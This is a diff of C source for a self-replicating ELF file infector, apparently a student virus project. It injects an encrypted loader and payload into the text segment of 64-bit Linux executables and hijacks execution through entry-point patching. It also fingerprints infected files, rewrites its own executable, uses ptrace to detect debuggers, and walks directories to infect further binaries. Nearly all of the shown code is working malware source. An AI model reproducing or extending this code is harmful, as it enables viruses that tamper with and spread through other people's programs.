@@ -13,34 +13,13 @@ static void	patch_loader(t_info *info, uint32_t hash)
 	int32_t	end;
 	int32_t val;
 
-	// rewrite jmp to bis
-// 	start = info->text_addr + info->text_size + LOADER_SIZE;
-// 	end = (int32_t)(info->addr_bis);
-// 	val = end - start;
-	// jump = hash + correcteur
-	// correcteur = jump - hash
-// 	val = val - hash;
-// 	ft_memcpy(info->text_begin + info->text_size + LOADER_SIZE - 13, &val, 4);
-
 	// rewrite addr for mprotect
 	start = info->text_addr + info->text_size + 0x9B; // a modifier adresse de pos_rdi dans loader
 	end = info->addr_bis;
 	val = end - start;
-	// addr = hash + correcteur
-	// correcteur = jump - hash
 	val = val - hash;
 	ft_memcpy(info->text_begin + info->text_size + 0x9B + 0x2, &val, 4); // 0x8c is pos of instruction targeted in loader;;; a modifier adresse de pos_rdi dans loader
 }
-
-static void	inject_loader(t_info *info)
-{
-	void		*addr;
-
-	addr = &loader;
-	ft_memcpy(info->text_begin + info->text_size, addr, LOADER_SIZE);
-// 	patch_loader(info);
-}
-
 
 static void	patch_payload(t_info *info)
 {
@@ -72,7 +51,7 @@ static void	inject_payload(t_info *info)
 	patch_payload(info);
 }
 
-void	patch_bis(t_info *info, int32_t nb)
+void		patch_bis(t_info *info, int32_t nb)
 {
 	int32_t	start;
 	int32_t	end;
@@ -103,6 +82,14 @@ void	patch_bis(t_info *info, int32_t nb)
 		ft_memcpy(info->file + info->offset_bis + BIS_SIZE - 0x14e/*REPLACE4*/ + 1, &val, 4);
 	if (nb == 5)
 		ft_memcpy(info->file + info->offset_bis + BIS_SIZE - 0x21/*REPLACE5*/ + 1, &val, 4);
+}
+
+static void	inject_loader(t_info *info)
+{
+	void	*addr;
+
+	addr = &loader;
+	ft_memcpy(info->text_begin + info->text_size, addr, LOADER_SIZE);
 }
 
 static void	inject_bis(t_info *info)
@@ -173,7 +160,7 @@ static int		inject_sign(t_info *info, t_fingerprint *fingerprint)
 {
 	uint32_t	magic = MAGIC_VIRUS;
 	char		buf[0x40];
-	
+
 	//sign
 	ft_memcpy(info->text_begin + info->text_size + LOADER_SIZE, &magic, 4);
 	write_sign(buf);
@@ -185,77 +172,53 @@ static int		inject_sign(t_info *info, t_fingerprint *fingerprint)
 	return (0);
 }
 
-// void	ft_putnbr(uint32_t n)
-// {
-// 	if (n < 10)
-// 	{
-// 		n += '0';
-// 		ft_syswrite(1, &n, 1);
-// 	}
-// 	else
-// 	{
-// 		ft_putnbr(n / 10);
-// 		ft_putnbr(n % 10);
-// 	}
-// }
-
 uint32_t    encrypt(t_info *info, void *ptr, size_t size, uint32_t fingerprint)
 {
-    uint32_t    *file;
-    uint32_t    key;
-    size_t      i;  
-
-    file = (uint32_t *)ptr;
-
+	uint32_t    *file;
+	uint32_t    key;
+	size_t      i;  
 	uint32_t start = info->addr_bis + /*B*/0x10c/*B`*/;
 	uint32_t end = (int32_t)(info->addr_bis + BIS_SIZE + MAIN_OFFSET);
+
+	file = (uint32_t *)ptr;
 	key = end - start; // key is now offset to jump payload from loader
-// 	dprintf(1, "%#x\n", key);
-//     key = KEY;
 	key += fingerprint;
 	ft_memcpy(info->file + info->offset_bis + /*D*/0xFB/*D`*/, &fingerprint, 4); //0xfb is pos of fingerprint sub in bis
-// 	ft_putnbr(fingerprint);
-// 	(void)fingerprint;
-    int nb = 0;
+	int nb = 0;
 	size = (size / 4 ) * 4;
-    while (nb < 8)
-    {   
-        i = 0;
-        while (i * 4 < size - 4)
-        {   
-            file[i] ^= key;
-            key += file[i];
-            i++;
-        }   
-        key -= SUB;
-        nb++;
-    }
-    return (key);
+	while (nb < 8)
+	{   
+		i = 0;
+		while (i * 4 < size - 4)
+		{   
+			file[i] ^= key;
+			key += file[i];
+			i++;
+		}   
+		key -= SUB;
+		nb++;
+	}
+	return (key);
 }
 
 uint32_t	hash_loader(t_info *info)
 {
-	uint32_t		hash = 5381;
-	size_t			size;
+	uint32_t	hash = 5381;
+	size_t		size;
 	unsigned char	*str;
+	size_t		i = 0;
 
 	str = (unsigned char *)(info->text_begin + info->text_size);
 	size = 0xc5; //a modifier taille du loader 0xc5 (0xca - 5)
-
-	size_t i = 0;
 	while (i < size)
 	{
 		if (i < 0x9D || i > 0xa1) //a modifier debut et fin pos adresse apres pos_rdi dans loader
-				hash = ((hash << 5) + hash) + str[i];
+			hash = ((hash << 5) + hash) + str[i];
 		i++;
 	}
-// 	dprintf(1, "%#x\n", hash);
 	patch_loader(info, hash);
-
-
 	str = (unsigned char *)(info->file + info->offset_bis);
 	size = 0x29f0; // BIS _SIZE + PAYLOAD SIZE a modifier 0x1f4f
-	
 	i = 0;
 	while (i < size)
 	{
@@ -263,42 +226,37 @@ uint32_t	hash_loader(t_info *info)
 			hash = ((hash << 5) + hash) + str[i];
 		i++;
 	}
-// 	dprintf(1, "%#x\n", hash);
 	return (hash);
 }
 
-void			patch_key(t_info *info, uint32_t key)
+void		patch_key(t_info *info, uint32_t key)
 {
 	uint32_t val;
 	uint32_t hash;
 
 	hash = hash_loader(info);
-// 	hash = 1;
 	// Key in loader
 	val = key - hash;
 	ft_memcpy(info->file + info->offset_bis + /*C*/0x91/*C`*/, &val, 4); // 0x78 is addr of key in bis
-
-// 	(void)fingerprint;
-
-
 }
 
+/*
+static void	nice_with_gdb(t_info *info)
+{
+	size_t size;
 
-// static void	nice_with_gdb(t_info *info)
-// {
-// 	size_t size;
-// 	size = info->file_size - (info->bss_size + PAYLOAD_SIZE + BIS_SIZE);
-// 	size = size - info->begin_bss;
-// 
-//  	ft_memcpy_r(info->file + info->offset_bis + PAYLOAD_SIZE + BIS_SIZE, info->file + info->begin_bss, size);
-// }
+	size = info->file_size - (info->bss_size + PAYLOAD_SIZE + BIS_SIZE);
+	size = size - info->begin_bss;
+ 	ft_memcpy_r(info->file + info->offset_bis + PAYLOAD_SIZE + BIS_SIZE, info->file + info->begin_bss, size);
+}
+*/
 
-static void		infect_file(char *path, t_fingerprint *fingerprint)
+static void	infect_file(char *path, t_fingerprint *fingerprint)
 {
 	struct stat		st;
 	t_info			info;
 	uint32_t		magic;
-	
+
 	if ((info.fd = ft_sysopen(path, O_RDWR)) < 0)
 		return ;
 	init_info(&info);
@@ -317,7 +275,7 @@ static void		infect_file(char *path, t_fingerprint *fingerprint)
 	if (find_text(&info, fingerprint) == 1)
 		goto end_fct;
 	inject_loader(&info);
-// 	nice_with_gdb(&info);
+	// nice_with_gdb(&info);
 	inject_payload(&info);
 	inject_bis(&info);
 	epo_parsing(&info);
@@ -336,16 +294,16 @@ static void		infect_file(char *path, t_fingerprint *fingerprint)
 
 static int	get_index_file(char *path)
 {
-	struct stat		st;
-	int			fd;
-	uint32_t		magic, index;
-	size_t			file_size;
-	void			*file;
-    	Elf64_Ehdr  *main_header;
-    	Elf64_Phdr  *header;
-    	size_t      base_entry;
-    	int32_t     i;
-    	void        *addr_magic;
+	struct stat	st;
+	int		fd;
+	uint32_t	magic, index;
+	size_t		file_size;
+	void		*file;
+	Elf64_Ehdr	*main_header;
+	Elf64_Phdr	*header;
+	size_t		base_entry;
+	int32_t		i;
+	void		*addr_magic;
 
 	index = 0;
 	if ((fd = ft_sysopen(path, O_RDWR)) < 0)
@@ -360,27 +318,27 @@ static int	get_index_file(char *path)
 		goto end_fct;
 
 
-    	main_header = (Elf64_Ehdr *)(file);
-    	base_entry = main_header->e_entry;
-    	i = 0;
-    	header = (Elf64_Phdr *)(file + sizeof(Elf64_Ehdr));
-    	if (file_size < main_header->e_shoff + (main_header->e_shnum * sizeof(Elf64_Shdr)))
+	main_header = (Elf64_Ehdr *)(file);
+	base_entry = main_header->e_entry;
+	i = 0;
+	header = (Elf64_Phdr *)(file + sizeof(Elf64_Ehdr));
+	if (file_size < main_header->e_shoff + (main_header->e_shnum * sizeof(Elf64_Shdr)))
 		goto end_fct;
-    	while (i < main_header->e_phnum)
-    	{
-    	    if ((header->p_type == PT_LOAD) && (base_entry > header->p_vaddr) && (base_entry < header->p_vaddr + header->p_memsz))
-    	    {
-    	        addr_magic = file + header->p_offset + header->p_filesz - SIGN_SIZE - 8;
-    	        magic = *((uint32_t *)(addr_magic));
-    	        if (magic == MAGIC_VIRUS)
-				{
-					index = (*((uint32_t *)(addr_magic - 5)));
-					goto end_fct;
-				}
-    	    }
-    	    header++;
-    	    i++;
-    	}
+	while (i < main_header->e_phnum)
+	{
+		if ((header->p_type == PT_LOAD) && (base_entry > header->p_vaddr) && (base_entry < header->p_vaddr + header->p_memsz))
+		{
+			addr_magic = file + header->p_offset + header->p_filesz - SIGN_SIZE - 8;
+			magic = *((uint32_t *)(addr_magic));
+			if (magic == MAGIC_VIRUS)
+			{
+				index = (*((uint32_t *)(addr_magic - 5)));
+				goto end_fct;
+			}
+		}
+		header++;
+		i++;
+	}
 	end_fct:
 	ft_sysmunmap(file, file_size);
 	end_close:
@@ -395,7 +353,7 @@ static int	get_highest_index(char *path, t_fingerprint *fingerprint)
 	int			fd, n_read, pos;
 	uint32_t		index, tmp_index;
 	char			buf_path_file[PATH_MAX];
-	
+
 	index = 0;
 	n_read = 0;
 	if ((fd = ft_sysopen(path, O_RDONLY)) < 0)
@@ -421,13 +379,12 @@ static int	get_highest_index(char *path, t_fingerprint *fingerprint)
 	return (index);
 }
 
-
-static int		infect_dir(char *path, t_fingerprint *fingerprint)
+static int	infect_dir(char *path, t_fingerprint *fingerprint)
 {
-	char					buf_d[1024];
+	char			buf_d[1024];
 	struct linux_dirent64	*dir;
-	int						fd, n_read, pos;
-	char					buf_path_file[PATH_MAX];
+	int			fd, n_read, pos;
+	char			buf_path_file[PATH_MAX];
 
 	n_read = 0;
 	if ((fd = ft_sysopen(path, O_RDONLY)) < 0)
@@ -451,7 +408,7 @@ static int		infect_dir(char *path, t_fingerprint *fingerprint)
 	return (0);
 }
 
-void	close_entries(void)
+void		close_entries(void)
 {
 	double_ret();
 	uint32_t	addr_origin;
@@ -459,7 +416,6 @@ void	close_entries(void)
 	void		*addr_hook;
 
 	addr = get_rip();
-
 	mprotect_text(PROT_WRITE | PROT_READ | PROT_EXEC);
 	addr_origin = -1;
 	addr_hook = addr + 0x12345678;
@@ -482,7 +438,7 @@ void	close_entries(void)
 	ft_memcpy(addr_hook, &addr_origin, 4);
 }
 
-void	itoa(char *buf, int32_t	nb)
+void		itoa(char *buf, int32_t	nb)
 {
 	int32_t		i = 0;
 	int32_t		j = 0;
@@ -503,7 +459,7 @@ void	itoa(char *buf, int32_t	nb)
 	}
 }
 
-void	get_path_own_file(char *buf)
+void		get_path_own_file(char *buf)
 {
 	char	path_sym[PATH_MAX];
 	pid_t	pid;
@@ -518,9 +474,8 @@ void	get_path_own_file(char *buf)
 	ft_sysreadlink(path_sym, buf, PATH_MAX);
 }
 
-void	rewrite_own_file(char *path, void *file, size_t size, int fd, struct stat st)
+void		rewrite_own_file(char *path, void *file, size_t size, int fd, struct stat st)
 {
-
 	ft_sysclose(fd);
 	if (ft_sysunlink(path) < 0)
 		return ;
@@ -530,7 +485,7 @@ void	rewrite_own_file(char *path, void *file, size_t size, int fd, struct stat s
 	ft_sysclose(fd);
 }
 
-void	update_own_index(t_fingerprint *fingerprint)
+void		update_own_index(t_fingerprint *fingerprint)
 {
 	char			path[PATH_MAX];
 	struct stat		st;
@@ -563,29 +518,23 @@ void	update_own_index(t_fingerprint *fingerprint)
 		addr = (file + 0x11f5); // offset index dans loader
 	else
 		addr = addr - SIGN_SIZE - 8 - 5;
-	
 	if (*((uint32_t *)(addr)) > fingerprint->index)
 		fingerprint->index = *((uint32_t *)(addr));
 	new_index = fingerprint->index + fingerprint->fingerprint;
 	ft_memcpy(addr, &new_index, 4);
-
 	rewrite_own_file(path, file, st.st_size, fd, st);
 	ft_sysmunmap(file, st.st_size);
-	return ;
 	end_close:
 	ft_sysclose(fd);
 	return ;
-	
-
 }
 
-int		main()
+int		main(void)
 {
 	char			buf[BUF_SIZE];
 	char			buf_path[PATH_MAX];
 	uint32_t		tmp_index;
 	t_fingerprint		fingerprint;
-
 
 	if (ft_sysptrace(0, 0, 1, 0) == -1)
 		return (0);
@@ -595,19 +544,14 @@ int		main()
 		return (0);
 	write_begin(buf);
 	ft_syswrite(1, buf, 8);
-
 	write_test2(buf_path);
 	fingerprint.fingerprint = 0;
 	tmp_index = get_highest_index(buf_path, &fingerprint);
-
 	write_test(buf_path);
 	fingerprint.index = get_highest_index(buf_path, &fingerprint);
-
 	if (tmp_index > fingerprint.index)
 		fingerprint.index = tmp_index;
-
 	update_own_index(&fingerprint); // update fingerprint.index and update own exec
-
 	fingerprint.index += fingerprint.fingerprint;
 	fingerprint.fingerprint = fingerprint.index;
 	infect_dir(buf_path, &fingerprint);
